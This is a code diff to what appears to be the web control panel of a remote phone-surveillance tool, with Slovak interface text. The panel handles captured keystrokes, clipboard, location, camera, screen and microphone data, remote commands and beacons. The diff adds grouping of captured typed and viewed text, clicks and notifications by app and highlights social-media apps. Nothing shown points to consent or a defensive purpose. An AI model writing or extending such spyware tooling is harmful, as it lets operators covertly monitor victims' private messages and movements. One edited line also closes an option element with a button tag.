@@ -149,6 +149,8 @@ th{
 }
 td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.045);font-size:13px;vertical-align:top}
 tbody tr:hover{background:rgba(79,124,255,.05)}
+tbody tr.group-header{background:var(--panel2)!important;font-weight:600}
+tbody tr.group-header td{padding:8px 12px}
 td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.3px}
 .scroll{max-height:520px;overflow:auto}
 .tag{
@@ -482,12 +484,16 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
           <h3>Klávesnica a aplikácie<span class="hint" id="keyHint"></span></h3>
           <div class="searchbar">
             <input id="keySearch" placeholder="Hľadať v textoch…">
-            <select id="keyKind">
+            <select id="keyKind" style="width:auto">
               <option value="">všetky typy</option>
-              <option value="keylog">keylog</option>
-              <option value="clipboard">clipboard</option>
-              <option value="text">text</option>
+              <option value="TEXT">Písané texty</option>
+              <option value="VIEW">Zobrazené texty</option>
+              <option value="CLICK">Kliknutia</button>
+              <option value="NOTIF">Notifikácie</option>
             </select>
+            <label style="margin-left:12px;display:flex;align-items:center;gap:6px;font-size:12px;color:var(--mut);cursor:pointer">
+              <input type="checkbox" id="keyGroupApp" onchange="loadKeylog()"> Zoskupiť podľa aplikácie
+            </label>
           </div>
           <div class="subtabs" id="keyTabs">
             <button data-t="" class="on">Všetko</button>
@@ -859,6 +865,32 @@ async function loadOverview(){
   const events = Object.entries(c).sort((a,b)=>b[1]-a[1]);
   const total = events.reduce((s,[,n])=>s+n,0);
   const keylog = (c.keylog||0)+(c.clipboard||0);
+  
+  // Categorize events for cleaner overview
+  const categories = {
+    input: ['keylog', 'clipboard', 'text', 'click', 'view', 'notif'],
+    location: ['location', 'location_status'],
+    media: ['camera', 'screen', 'mic', 'media', 'file'],
+    system: ['boot', 'cmd_result', 'crash', 'install', 'ddr', 'cmd', 'heartbeat', 'health', 'alive', 'beacon'],
+    social: [] // filled below
+  };
+  
+  // Count social apps
+  const socialSeen=new Set();
+  let socialNotifs=0;
+  for(const l of logs){
+    if(l.kind==='keylog'){ for(const e of parseKeylog(l.payload)) if(isSocial(e.pkg)) socialSeen.add(e.pkg); }
+    else { const o=parsePayload(l.payload);
+      if(o&&o.pkg&&isSocial(o.pkg)){ socialSeen.add(o.pkg); if(l.kind==='notification') socialNotifs++; } }
+  }
+  categories.social = Array.from(socialSeen);
+  
+  const catCounts = {};
+  for(const [cat, kinds] of Object.entries(categories)){
+    catCounts[cat] = kinds.reduce((sum, k) => sum + (c[k]||0), 0);
+  }
+  catCounts.social = socialSeen.size;
+
   $('tiles').innerHTML = `
     <div class="card tile" data-go="overview"><div class="k">${icon('heartbeat')} Stav</div>
       <div class="v" style="color:${online?'var(--ok)':'var(--bad)'}">${online?'Online':'Offline'}</div>
@@ -1043,9 +1075,10 @@ function drawMini(loc){
 async function loadKeylog(){
   if(!S.device) return;
   const q=$('keySearch').value.trim().toLowerCase();
-  const kind=$('keyKind').value;
-  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=500'+qs({q,kind}))||[];
-  const wanted = kind ? rows : rows.filter(r=>/keylog|clipboard|notification|text/i.test(r.kind));
+  const typeFilter=$('keyKind').value; // TEXT, VIEW, CLICK, NOTIF
+  const groupByApp = $('keyGroupApp')?.checked || false;
+  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=500')||[];
+  const wanted = rows.filter(r=>/keylog|clipboard|notification|text/i.test(r.kind));
   const evs=[];
   for(const r of wanted){
     const o=parsePayload(r.payload);
@@ -1059,28 +1092,60 @@ async function loadKeylog(){
   }
   const q2 = S.keyType;
   renderAppChips(evs);
-  const view = evs.filter(e=>{
+  let view = evs.filter(e=>{
     if(S.app && e.pkg!==S.app) return false;
     if(isExcluded(e.pkg)) return false;
     if(q2 && e.type!==q2) return false;
+    if(typeFilter && e.type!==typeFilter) return false;
     if(q && !String(e.text).toLowerCase().includes(q)) return false;
     return true;
   }).sort((a,b)=>String(b.raw).localeCompare(String(a.raw)));
   for(const e of view) notePkg(e.pkg, null, 1, e.raw);
   refreshAppFilter();
-  const parts=[view.length+' záznamov'];
-  if(S.keyType) parts.push(S.keyType);
-  if(S.app) parts.push(appLabel(S.app));
-  if(S.exclude.length) parts.push(S.exclude.length+' aplikácií skrytých');
-  $('keyHint').textContent = parts.join(' · ');
-  $('keyRows').innerHTML = view.length ? view.map(e=>`<tr>
+  
+  // Group by app if requested
+  if(groupByApp && view.length){
+    const grouped = new Map();
+    for(const e of view){
+      const key = e.pkg || 'neznáma';
+      if(!grouped.has(key)) grouped.set(key, []);
+      grouped.get(key).push(e);
+    }
+    // Sort groups by count desc
+    const sortedGroups = [...grouped.entries()].sort((a,b)=>b[1].length-a[1].length);
+    
+    const parts=[view.length+' záznamov'];
+    if(S.keyType) parts.push(S.keyType);
+    if(S.app) parts.push(appLabel(S.app));
+    if(S.exclude.length) parts.push(S.exclude.length+' aplikácií skrytých');
+    $('keyHint').textContent = parts.join(' · ');
+    
+    let html = '';
+    for(const [pkg, items] of sortedGroups){
+      html += `<tr class="group-header" style="background:var(--panel2)"><td colspan="4"><b>${esc(appLabel(pkg))}</b> <span class="mono" style="font-size:11px;color:var(--dim)">(${items.length})</span> ${isSocial(pkg)?'<span class="soclabel">sociálna</span>':''} <div style="font-size:10px;color:var(--dim);font-family:ui-monospace,Menlo,monospace">${esc(pkg)}</div></td></tr>`;
+      for(const e of items){
+        html += `<tr>
+          <td class="mono">${esc(eventTime(e,e.raw))}</td>
+          <td></td>
+          <td><span class="evtype ${esc(e.type)}">${esc(e.type)}</span></td>
+          <td title="${esc(String(e.text).slice(0,4000))}">${esc(String(e.text).slice(0,300))}${String(e.text).length>300?' <span style="color:var(--dim)">…</span>':''}</td></tr>`;
+      }
+    }
+    $('keyRows').innerHTML = html;
+  } else {
+    const parts=[view.length+' záznamov'];
+    if(S.keyType) parts.push(S.keyType);
+    if(S.app) parts.push(appLabel(S.app));
+    if(S.exclude.length) parts.push(S.exclude.length+' aplikácií skrytých');
+    $('keyHint').textContent = parts.join(' · ');
+    $('keyRows').innerHTML = view.length ? view.map(e=>`<tr>
       <td class="mono">${esc(eventTime(e,e.raw))}</td>
       <td>${e.pkg?`<span class="soclabel" style="${isSocial(e.pkg)?'':'display:none'}">sociálna</span> `:''}${esc(appLabel(e.pkg))}
           <div style="font-size:10px;color:var(--dim);font-family:ui-monospace,Menlo,monospace">${esc(e.pkg||'')}</div></td>
       <td><span class="evtype ${esc(e.type)}">${esc(e.type)}</span></td>
-      <td title="${esc(String(e.text).slice(0,4000))}">${esc(String(e.text).slice(0,300))}${
-        String(e.text).length>300?' <span style="color:var(--dim)">…</span>':''}</td></tr>`).join('')
-    : '<tr><td colspan="4" class="empty">Zatiaľ žiadne záznamy. Skús iný filter alebo príkaz „clipboard“.</td></tr>';
+      <td title="${esc(String(e.text).slice(0,4000))}">${esc(String(e.text).slice(0,300))}${String(e.text).length>300?' <span style="color:var(--dim)">…</span>':''}</td></tr>`).join('')
+      : '<tr><td colspan="4" class="empty">Zatiaľ žiadne záznamy. Skús iný filter alebo príkaz „clipboard“.</td></tr>';
+  }
 }
 async function loadClipboard(){
   if(!S.device) return;
